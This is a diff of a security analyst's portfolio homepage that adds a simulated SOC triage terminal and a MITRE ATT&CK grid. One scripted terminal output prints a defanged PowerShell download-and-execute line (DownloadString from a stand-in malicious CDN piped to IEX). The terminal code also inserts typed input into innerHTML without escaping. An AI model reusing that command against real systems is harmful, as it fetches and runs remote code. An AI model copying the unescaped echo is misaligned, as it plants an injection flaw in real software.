@@ -7,23 +7,14 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-
 <script>
 (function() {
-  function getInitialTheme() {
-    try {
-      const saved = localStorage.getItem('soban_theme');
-      if (saved) return saved;
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    } catch (e) {
-      return 'dark';
-    }
-  }
-  const theme = getInitialTheme();
-  document.documentElement.setAttribute('data-theme', theme);
+  try {
+    const saved = localStorage.getItem('soban_theme') || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+    document.documentElement.setAttribute('data-theme', saved);
+  } catch(e) {}
 })();
 </script>
-
 <style>
 
 :root {
@@ -40,12 +31,14 @@
   --accent-text: #C2410C;
   --accent-soft: #FFEDD5;
   --accent-glow: rgba(234, 88, 12, 0.18);
-  --accent-gradient: linear-gradient(135deg, #F97316 0%, #EA580C 100%);
   --emerald: #059669;
   --emerald-soft: #D1FAE5;
   --card-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.04), 0 2px 4px -2px rgba(0, 0, 0, 0.04);
   --card-shadow-hover: 0 16px 32px -8px rgba(234, 88, 12, 0.18);
-  --ambient-glow: radial-gradient(circle at 50% -10%, rgba(249, 115, 22, 0.09) 0%, transparent 60%);
+  --grid-color: rgba(234, 88, 12, 0.04);
+  --terminal-bg: #14151C;
+  --terminal-text: #F8FAFC;
+  --terminal-bar: #1E202C;
 }
 
 [data-theme="dark"] {
@@ -62,12 +55,14 @@
   --accent-text: #FB923C;
   --accent-soft: rgba(249, 115, 22, 0.12);
   --accent-glow: rgba(249, 115, 22, 0.28);
-  --accent-gradient: linear-gradient(135deg, #FB923C 0%, #F97316 100%);
   --emerald: #10B981;
   --emerald-soft: rgba(16, 185, 129, 0.15);
   --card-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.35), 0 2px 4px -2px rgba(0, 0, 0, 0.35);
   --card-shadow-hover: 0 16px 36px -8px rgba(249, 115, 22, 0.25);
-  --ambient-glow: radial-gradient(circle at 50% -10%, rgba(249, 115, 22, 0.16) 0%, transparent 65%);
+  --grid-color: rgba(249, 115, 22, 0.035);
+  --terminal-bg: #0E0F15;
+  --terminal-text: #F8FAFC;
+  --terminal-bar: #181922;
 }
 
 *, *::before, *::after {
@@ -84,8 +79,12 @@ body {
   margin: 0;
   padding: 0;
   background: var(--paper);
-  background-image: var(--ambient-glow);
-  background-repeat: no-repeat;
+  background-image: 
+    radial-gradient(circle at 50% -10%, rgba(249, 115, 22, 0.12) 0%, transparent 65%),
+    linear-gradient(to right, var(--grid-color) 1px, transparent 1px),
+    linear-gradient(to bottom, var(--grid-color) 1px, transparent 1px);
+  background-size: 100% 100%, 36px 36px, 36px 36px;
+  background-repeat: no-repeat, repeat, repeat;
   background-attachment: fixed;
   color: var(--ink);
   font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -93,6 +92,18 @@ body {
   line-height: 1.65;
   transition: background-color 0.2s ease, color 0.2s ease;
   -webkit-font-smoothing: antialiased;
+}
+
+/* Reading Progress Bar for Case Pages */
+.scroll-progress-bar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 3px;
+  background: linear-gradient(90deg, #F97316, #FB923C);
+  width: 0%;
+  z-index: 100;
+  transition: width 0.1s ease;
 }
 
 .container {
@@ -320,12 +331,12 @@ body {
   font-size: 12px;
 }
 
-/* Status Pill */
+/* Status Pill with Pulsing Radar Dot */
 .status-pill {
   display: inline-flex;
   align-items: center;
-  gap: 8px;
-  padding: 6px 14px;
+  gap: 10px;
+  padding: 6px 16px;
   background: var(--accent-soft);
   border: 1px solid var(--accent);
   border-radius: 9999px;
@@ -335,12 +346,36 @@ body {
   margin-bottom: 24px;
 }
 
+.status-dot-wrap {
+  position: relative;
+  width: 10px;
+  height: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
 .status-dot {
   width: 8px;
   height: 8px;
   border-radius: 50%;
   background-color: var(--accent);
   box-shadow: 0 0 10px var(--accent);
+}
+
+.status-dot-ping {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  background-color: var(--accent);
+  opacity: 0.75;
+  animation: radarPing 1.8s cubic-bezier(0, 0, 0.2, 1) infinite;
+}
+
+@keyframes radarPing {
+  0% { transform: scale(1); opacity: 0.8; }
+  75%, 100% { transform: scale(2.4); opacity: 0; }
 }
 
 /* Sections */
@@ -442,18 +477,245 @@ body {
   margin-bottom: 8px;
 }
 
-/* Code Block */
+/* Code Block & Interactive Copy Button */
+.code-block-wrap {
+  position: relative;
+  margin: 14px 0;
+}
+
 .code-block {
   font-family: 'IBM Plex Mono', monospace;
   font-size: 12.5px;
   background: var(--surface-elevated);
   border: 1px solid var(--hair);
   border-radius: 8px;
-  padding: 14px;
+  padding: 16px 18px;
   overflow-x: auto;
   color: var(--ink);
   white-space: pre-wrap;
-  margin: 12px 0;
+  margin: 0;
+}
+
+.copy-snippet-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  padding: 4px 10px;
+  border-radius: 6px;
+  border: 1px solid var(--hair);
+  background: var(--surface);
+  color: var(--mute);
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+
+.copy-snippet-btn:hover {
+  color: var(--accent);
+  border-color: var(--accent);
+}
+
+/* ==============================================================================
+   INTERACTIVE LIVE SOC TRIAGE TERMINAL
+   ============================================================================== */
+.soc-terminal-wrap {
+  margin: 44px 0 20px;
+}
+
+.soc-terminal {
+  background: var(--terminal-bg);
+  border: 1px solid var(--hair);
+  border-radius: 12px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.45);
+  overflow: hidden;
+  font-family: 'IBM Plex Mono', monospace;
+  color: var(--terminal-text);
+}
+
+.terminal-titlebar {
+  background: var(--terminal-bar);
+  padding: 10px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid var(--hair);
+}
+
+.terminal-dots {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.terminal-dot {
+  width: 11px;
+  height: 11px;
+  border-radius: 50%;
+}
+
+.dot-red { background: #EF4444; }
+.dot-yellow { background: #F59E0B; }
+.dot-green { background: #10B981; }
+
+.terminal-title {
+  font-size: 12.5px;
+  color: #94A3B8;
+  letter-spacing: -0.01em;
+}
+
+.terminal-status-indicator {
+  font-size: 11.5px;
+  color: var(--accent);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.terminal-presets-bar {
+  padding: 12px 18px;
+  background: rgba(255, 255, 255, 0.02);
+  border-bottom: 1px solid var(--hair);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+.terminal-preset-label {
+  font-size: 11.5px;
+  color: #94A3B8;
+  margin-right: 4px;
+}
+
+.preset-chip {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  padding: 5px 11px;
+  border-radius: 6px;
+  border: 1px solid rgba(249, 115, 22, 0.3);
+  background: rgba(249, 115, 22, 0.08);
+  color: #FB923C;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+
+.preset-chip:hover {
+  background: rgba(249, 115, 22, 0.2);
+  border-color: #F97316;
+  color: #FFFFFF;
+}
+
+.terminal-body {
+  padding: 20px 22px;
+  min-height: 240px;
+  max-height: 380px;
+  overflow-y: auto;
+  font-size: 13.5px;
+  line-height: 1.7;
+}
+
+.terminal-body .cmd-line {
+  color: #38BDF8;
+}
+
+.terminal-body .output-info {
+  color: #94A3B8;
+}
+
+.terminal-body .output-alert {
+  color: #F59E0B;
+}
+
+.terminal-body .output-drop {
+  color: #EF4444;
+}
+
+.terminal-body .output-success {
+  color: #10B981;
+}
+
+.terminal-body .output-accent {
+  color: #FB923C;
+  font-weight: 500;
+}
+
+.terminal-input-bar {
+  padding: 12px 18px;
+  background: var(--terminal-bar);
+  border-top: 1px solid var(--hair);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.terminal-prompt {
+  color: var(--accent);
+  font-weight: 600;
+  font-size: 13px;
+  white-space: nowrap;
+}
+
+.terminal-input {
+  flex-grow: 1;
+  background: transparent;
+  border: none;
+  outline: none;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 13px;
+  color: var(--terminal-text);
+}
+
+/* ==============================================================================
+   MITRE ATT&CK ENTERPRISE MATRIX NAVIGATOR
+   ============================================================================== */
+.mitre-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+  gap: 16px;
+  margin-top: 24px;
+}
+
+.mitre-card {
+  padding: 18px;
+  border-radius: 10px;
+  border: 1px solid var(--hair);
+  background: var(--surface);
+  transition: all 0.2s ease;
+  cursor: pointer;
+}
+
+.mitre-card:hover {
+  border-color: var(--accent);
+  transform: translateY(-2px);
+  box-shadow: var(--card-shadow);
+}
+
+.mitre-card.selected {
+  border-color: var(--accent);
+  background: var(--accent-soft);
+}
+
+.mitre-tactic-name {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  color: var(--accent-text);
+  font-weight: 600;
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+
+.mitre-tech-id {
+  font-family: 'Space Grotesk', sans-serif;
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--ink);
+  margin-bottom: 4px;
+}
+
+.mitre-case-count {
+  font-size: 12.5px;
+  color: var(--mute);
 }
 
 /* Modal */
@@ -594,9 +856,24 @@ footer {
   border-top: 1px solid var(--hair);
 }
 
+/* Print styles for Executive Reports */
+@media print {
+  .site-header, footer, .btn, .hamburger-btn, .mobile-menu, .terminal-presets-bar, .terminal-input-bar {
+    display: none !important;
+  }
+  body {
+    background: #FFFFFF !important;
+    color: #000000 !important;
+  }
+  .card, .analysis-box, .workflow-box {
+    border: 1px solid #CCCCCC !important;
+    box-shadow: none !important;
+  }
+}
+
 /* Hero Section */
 .hero {
-  padding: 68px 0 54px;
+  padding: 68px 0 36px;
 }
 .hero h1 {
   font-family: 'Space Grotesk', sans-serif;
@@ -623,7 +900,7 @@ footer {
   display: grid;
   grid-template-columns: repeat(4, minmax(0, 1fr));
   gap: 16px;
-  margin: 36px 0 0;
+  margin: 32px 0 0;
   padding: 24px;
   background: var(--surface);
   border: 1px solid var(--hair);
@@ -807,7 +1084,8 @@ footer {
     <nav class="desktop-nav" aria-label="Primary navigation">
       <a href="index.html" class="active">Home</a>
       <a href="investigations.html" class="">Investigations (17)</a>
-      <a href="index.html#methodology">Methodology</a>
+      <a href="index.html#terminal">Interactive Terminal</a>
+      <a href="index.html#mitre">MITRE Matrix</a>
       <a href="index.html#capabilities">Capabilities</a>
       <a href="contact.html" class="">Contact &amp; Connect</a>
     </nav>
@@ -826,7 +1104,8 @@ footer {
       <nav class="mobile-nav-links">
         <a href="index.html" class="active">Home</a>
         <a href="investigations.html" class="">Investigations (17)</a>
-        <a href="index.html#methodology">Methodology</a>
+        <a href="index.html#terminal">Interactive Terminal</a>
+        <a href="index.html#mitre">MITRE ATT&amp;CK Matrix</a>
         <a href="index.html#capabilities">Capabilities</a>
         <a href="contact.html" class="">Contact &amp; Connect</a>
       </nav>
@@ -842,7 +1121,10 @@ footer {
   <!-- Hero Section with ReactBits Scramble Title -->
   <section class="hero">
     <div class="status-pill">
-      <span class="status-dot"></span>
+      <div class="status-dot-wrap">
+        <span class="status-dot-ping"></span>
+        <span class="status-dot"></span>
+      </div>
       <span>MSSP SOC Analyst · ISC2 CC Certified · Network Defense</span>
     </div>
     
@@ -856,9 +1138,10 @@ footer {
     
     <div class="hero-cta">
       <a href="./investigations.html" class="btn btn-primary">Browse All 17 Investigations &rarr;</a>
+      <a href="#terminal" class="btn">Launch Interactive Terminal ↓</a>
       <a href="https://www.linkedin.com/in/sheikhsobanfayaz" target="_blank" rel="noopener noreferrer" class="btn">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.46 10.9v8.37H9.2V10.9H6.46M7.83 6.45c-.9 0-1.63.73-1.63 1.63s.73 1.63 1.63 1.63 1.63-.73 1.63-1.63-.73-1.63-1.63-1.63Z"/></svg>
-        Connect on LinkedIn
+        LinkedIn
       </a>
       <button type="button" class="btn" onclick="copyEmail('sheikhsobanfayaz@gmail.com')">Copy Email</button>
     </div>
@@ -879,6 +1162,45 @@ footer {
       <div class="stat-box">
         <span class="stat-val">UNSLOTH + AI</span>
         <span class="stat-label">SECOPS FINE-TUNING</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==============================================================================
+       INTERACTIVE LIVE SOC TRIAGE TERMINAL
+       ============================================================================== -->
+  <section id="terminal" class="soc-terminal-wrap">
+    <div class="soc-terminal">
+      <div class="terminal-titlebar">
+        <div class="terminal-dots">
+          <span class="terminal-dot dot-red"></span>
+          <span class="terminal-dot dot-yellow"></span>
+          <span class="terminal-dot dot-green"></span>
+        </div>
+        <div class="terminal-title">soban@secops-analyst-terminal:~ (Sentinel · EDR · Wireshark · Unsloth)</div>
+        <div class="terminal-status-indicator">● LIVE CONSOLE</div>
+      </div>
+
+      <div class="terminal-presets-bar">
+        <span class="terminal-preset-label">Simulate Triage:</span>
+        <button type="button" class="preset-chip" onclick="runTerminalScenario('c2')">▶ 1. Sentinel C2 Triage</button>
+        <button type="button" class="preset-chip" onclick="runTerminalScenario('unsloth')">▶ 2. Unsloth AI Deobfuscation</button>
+        <button type="button" class="preset-chip" onclick="runTerminalScenario('vpn')">▶ 3. VPN Interception Capture</button>
+        <button type="button" class="preset-chip" onclick="runTerminalScenario('portscan')">▶ 4. Internal Port Scan</button>
+        <button type="button" class="preset-chip" onclick="clearTerminal()">Clear</button>
+      </div>
+
+      <div class="terminal-body" id="terminalBody">
+        <div class="output-info">SecOps Interactive Console v3.8 - Sheikh Soban Fayaz</div>
+        <div class="output-info">Type <span class="output-accent">'help'</span>, <span class="output-accent">'cases'</span>, or click a preset button above to simulate live alert correlation.</div>
+        <br>
+        <div class="cmd-line">soban@secops:~$ <span style="color: #94A3B8;">system-status --ready</span></div>
+        <div class="output-success">✔ Telemetry pipelines connected: CommonSecurityLog, Sysmon, Netskope DLP, Unsloth AI.</div>
+      </div>
+
+      <div class="terminal-input-bar">
+        <span class="terminal-prompt">soban@secops:~$</span>
+        <input type="text" id="terminalInput" class="terminal-input" placeholder="Type a command (e.g. 'c2', 'unsloth', 'vpn', 'cases', 'help')..." autocomplete="off" spellcheck="false">
       </div>
     </div>
   </section>
@@ -920,6 +1242,49 @@ footer {
       <a href="./investigations.html" class="btn btn-primary">View All 17 Investigations &rarr;</a>
     </div>
     <div id="featuredGrid" class="projects-grid"></div>
+  </section>
+
+  <!-- MITRE ATT&CK Matrix Interactive Navigator -->
+  <section id="mitre" class="sec">
+    <div class="sec-head">
+      <div>
+        <h2>MITRE ATT&amp;CK Enterprise Matrix Coverage</h2>
+        <p class="sec-desc">Mapping enterprise incident triage playbooks directly against industry-standard adversary tactics and techniques.</p>
+      </div>
+      <a href="./investigations.html" class="btn">Explore All 17 Cases &rarr;</a>
+    </div>
+    <div class="mitre-grid">
+      <div class="card mitre-card" onclick="window.location.href='./cases/sentinel-c2-indicator.html'">
+        <div class="mitre-tactic-name">Command &amp; Control</div>
+        <div class="mitre-tech-id">T1071.001 · Web Protocols</div>
+        <div class="mitre-case-count">Sentinel C2 &amp; Egress Disposition</div>
+      </div>
+      <div class="card mitre-card" onclick="window.location.href='./cases/unsloth-lora-secops.html'">
+        <div class="mitre-tactic-name">Defense Evasion</div>
+        <div class="mitre-tech-id">T1027 · Obfuscated Scripts</div>
+        <div class="mitre-case-count">Unsloth Llama-3 4-Bit LoRA</div>
+      </div>
+      <div class="card mitre-card" onclick="window.location.href='./cases/internal-portscan-analysis.html'">
+        <div class="mitre-tactic-name">Discovery</div>
+        <div class="mitre-tech-id">T1046 · Network Discovery</div>
+        <div class="mitre-case-count">Internal Port Scan &amp; Sweep</div>
+      </div>
+      <div class="card mitre-card" onclick="window.location.href='./cases/netskope-dlp-justification.html'">
+        <div class="mitre-tactic-name">Exfiltration</div>
+        <div class="mitre-tech-id">T1567 · Web Service Transfer</div>
+        <div class="mitre-case-count">Cloud DLP &amp; User Justification</div>
+      </div>
+      <div class="card mitre-card" onclick="window.location.href='./cases/ssl-vpn-triage.html'">
+        <div class="mitre-tactic-name">Initial Access</div>
+        <div class="mitre-tech-id">T1078 · Valid Accounts</div>
+        <div class="mitre-case-count">SSL VPN Impossible Travel</div>
+      </div>
+      <div class="card mitre-card" onclick="window.location.href='./cases/sysmon-c2.html'">
+        <div class="mitre-tactic-name">Execution</div>
+        <div class="mitre-tech-id">T1059.001 · PowerShell</div>
+        <div class="mitre-case-count">Sysmon Event 3 &amp; Event 4688</div>
+      </div>
+    </div>
   </section>
 
   <!-- SecOps Methodology -->
@@ -1224,6 +1589,34 @@ function initDecryptedText() {
   });
 }
 
+// Reading Progress Bar
+function initReadingProgress() {
+  const bar = document.querySelector('.scroll-progress-bar');
+  if (!bar) return;
+  window.addEventListener('scroll', () => {
+    const scrollTop = window.scrollY || document.documentElement.scrollTop;
+    const docHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    const progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+    bar.style.width = Math.min(100, Math.max(0, progress)) + '%';
+  });
+}
+
+// Copy Code Button Helper
+function copyCodeText(btn) {
+  const codeBlock = btn.closest('.code-block-wrap').querySelector('.code-block');
+  if (!codeBlock) return;
+  const text = codeBlock.innerText;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => {
+      const old = btn.innerText;
+      btn.innerText = '✔ Copied!';
+      setTimeout(() => { btn.innerText = old; }, 2000);
+    });
+  } else {
+    fallbackCopy(text);
+  }
+}
+
 function showToast(msg) {
   let t = document.getElementById('toast');
   if (!t) {
@@ -1266,6 +1659,7 @@ document.addEventListener('DOMContentLoaded', () => {
   initMobileMenu();
   initSpotlights();
   initDecryptedText();
+  initReadingProgress();
 });
 </script>
 
@@ -1279,7 +1673,10 @@ function renderFeaturedCases() {
   grid.innerHTML = FEATURED_CASES.map(p => `
     <article class="card spotlight project-card">
       <div>
-        <span class="project-cat">${p.categoryLabel}</span>
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 8px;">
+          <span class="project-cat">${p.categoryLabel}</span>
+          <span style="font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--mute);">5 min read</span>
+        </div>
         <h3>${p.title}</h3>
         <p>${p.summary}</p>
         <div class="tag-row">
@@ -1322,7 +1719,10 @@ function openModal(id) {
     </div>
 
     <h4>Diagnostic Query / Logic Sample</h4>
-    <div class="code-block">${p.snippet}</div>
+    <div class="code-block-wrap">
+      <button type="button" class="copy-snippet-btn" onclick="copyCodeText(this)">Copy Query</button>
+      <div class="code-block">${p.snippet}</div>
+    </div>
 
     <h4>Competencies &amp; Value Demonstrated</h4>
     <ul style="list-style: none; padding-left: 0; font-size: 14px; color: var(--ink2); line-height: 1.6;">${valuesHtml}</ul>
@@ -1342,6 +1742,108 @@ function openModal(id) {
 function closeModal() {
   document.getElementById('projectModal').classList.remove('open');
 }
+
+// Interactive SOC Terminal Logic
+function appendTerminal(html) {
+  const b = document.getElementById('terminalBody');
+  if (!b) return;
+  const d = document.createElement('div');
+  d.innerHTML = html;
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
+}
+
+function clearTerminal() {
+  const b = document.getElementById('terminalBody');
+  if (b) b.innerHTML = '<div class="output-info">Console cleared. Type \'help\' or choose a preset.</div>';
+}
+
+function runTerminalScenario(type) {
+  if (type === 'c2') {
+    appendTerminal(`
+      <br>
+      <div class="cmd-line">soban@secops:~$ <span style="color:#FFF;">kql-query --incident #53358 --dataset CommonSecurityLog</span></div>
+      <div class="output-alert">[!] Incident #53358 Trigger: Possible C2 Callback | Source: 10.16.56.241 | Target: external-doc-service.com</div>
+      <div class="output-info">[-] Correlating Host Socket (msedge.exe) with Firewall DeviceAction...</div>
+      <div class="output-drop">[DROP] Perimeter Firewall rule 'Block_Untrusted_Egress' dropped TCP handshake at 14:02:18 GST</div>
+      <div class="output-success">[VERDICT: MITIGATED] Zero external egress. Host verified clean. Blast radius: 1 asset.</div>
+      <div><a href="./cases/sentinel-c2-indicator.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Detailed Sentinel C2 Case Study</a></div>
+    `);
+  } else if (type === 'unsloth') {
+    appendTerminal(`
+      <br>
+      <div class="cmd-line">soban@secops:~$ <span style="color:#FFF;">unsloth-infer --model llama-3-8b-secops --input sample_obf.ps1</span></div>
+      <div class="output-info">[-] Loading local 4-bit LoRA adapter weights via Triton kernels (VRAM: 6.8 GB)...</div>
+      <div class="output-accent">[DEOBFUSCATION COMPLETE in 0.42s]:</div>
+      <div style="color: #94A3B8; font-size: 12px;">$payload = [System.Net.WebClient]::DownloadString('hxxps://malicious-cdn.net/stage2.bin'); IEX $payload</div>
+      <div class="output-alert">[MITRE ATT&amp;CK]: T1059.001 (Command &amp; Scripting Interpreter) | T1027 (Obfuscated Files)</div>
+      <div class="output-success">[STATUS]: Offline airgap preserved. Zero client PII transmitted to cloud.</div>
+      <div><a href="./cases/unsloth-lora-secops.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Full Unsloth LoRA Fine-Tuning Case Study</a></div>
+    `);
+  } else if (type === 'vpn') {
+    appendTerminal(`
+      <br>
+      <div class="cmd-line">soban@secops:~$ <span style="color:#FFF;">pcap-trace --client 192.168.1.105 --firewall-wan 198.51.100.1</span></div>
+      <div class="output-info">[-] Client Adapter: Wireshark captures Client Hello on port 4433...</div>
+      <div class="output-drop">[DIAGNOSTIC]: Packet absent on Firewall WAN interface X1.</div>
+      <div class="output-alert">[ROOT CAUSE]: Local route table conflict: Secondary active VPN injected 0.0.0.0/0 route with metric 10.</div>
+      <div class="output-success">[RESOLUTION]: Applied split-tunnel route exclusion. SSL VPN tunnel established in 1.2s.</div>
+      <div><a href="./cases/multi-vpn-routing-conflict.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Multi-VPN Route Interception Case Study</a></div>
+    `);
+  } else if (type === 'portscan') {
+    appendTerminal(`
+      <br>
+      <div class="cmd-line">soban@secops:~$ <span style="color:#FFF;">net-flow-analyze --src 10.12.8.254 --dst 10.12.7.114</span></div>
+      <div class="output-alert">[!] High Connection Volume Flagged: 107,432 connection attempts observed.</div>
+      <div class="output-info">[-] Enumerating target port scope: Port 445 (SMB) = 99.8% of traffic.</div>
+      <div class="output-info">[-] Cross-referencing CMDB asset registry: Host 10.12.8.254 = Central Veeam Backup Node.</div>
+      <div class="output-success">[VERDICT: BENIGN REPETITION] Legitimate scheduled backup stream. Scoped exclusion proposed.</div>
+      <div><a href="./cases/internal-portscan-analysis.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Internal Port-Scan Case Study</a></div>
+    `);
+  }
+}
+
+document.getElementById('terminalInput').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    const val = e.target.value.trim().toLowerCase();
+    e.target.value = '';
+    if (!val) return;
+
+    if (val === 'help') {
+      appendTerminal(`
+        <div class="cmd-line">soban@secops:~$ help</div>
+        <div class="output-info">Available commands:</div>
+        <div class="output-info">  c2        - Simulate Sentinel custom indicator triage</div>
+        <div class="output-info">  unsloth   - Run local Llama-3 script deobfuscation</div>
+        <div class="output-info">  vpn       - Trace multi-VPN routing collision</div>
+        <div class="output-info">  portscan  - Investigate high-volume internal connection sweep</div>
+        <div class="output-info">  cases     - View list of all 17 case studies</div>
+        <div class="output-info">  clear     - Clear terminal screen</div>
+      `);
+    } else if (val === 'cases') {
+      appendTerminal(`
+        <div class="cmd-line">soban@secops:~$ cases</div>
+        <div class="output-accent">Total 17 Investigation Case Studies Available:</div>
+        <div class="output-info">1. Unsloth AI Fine-Tuning | 2. Sentinel C2 Triage | 3. Internal Port-Scan</div>
+        <div class="output-info">4. Netskope DLP Justification | 5. WAF Reconnaissance | 6. IP Reputation Correlation</div>
+        <div class="output-info">7. Multi-VPN Routing Collision | 8. Site-to-Site IPsec Proposal Error | 9. Firewall Persistence</div>
+        <div class="output-info">10. Firewall Service Reachability | 11. Layer 2 Bridge Anti-Spoof | 12. Physical Interface Diagnostics</div>
+        <div class="output-info">13. Cloud Sandbox ATP &amp; EDR | 14. SSL VPN Impossible Travel | 15. MSSP Queue Tuning</div>
+        <div class="output-info">16. Anonymized Log Triage | 17. Windows 4688 Sysmon C2 Beaconing</div>
+        <div><a href="./investigations.html" style="color: #FB923C; text-decoration: underline;">&rarr; Browse All in Dedicated Investigations Hub</a></div>
+      `);
+    } else if (val === 'clear') {
+      clearTerminal();
+    } else if (val === 'c2' || val === 'unsloth' || val === 'vpn' || val === 'portscan') {
+      runTerminalScenario(val);
+    } else {
+      appendTerminal(`
+        <div class="cmd-line">soban@secops:~$ ${val}</div>
+        <div class="output-drop">Command not recognized. Type 'help' for available commands or click a preset above.</div>
+      `);
+    }
+  }
+});
 
 document.getElementById('closeModalBtn').addEventListener('click', closeModal);
 document.getElementById('projectModal').addEventListener('click', (e) => {
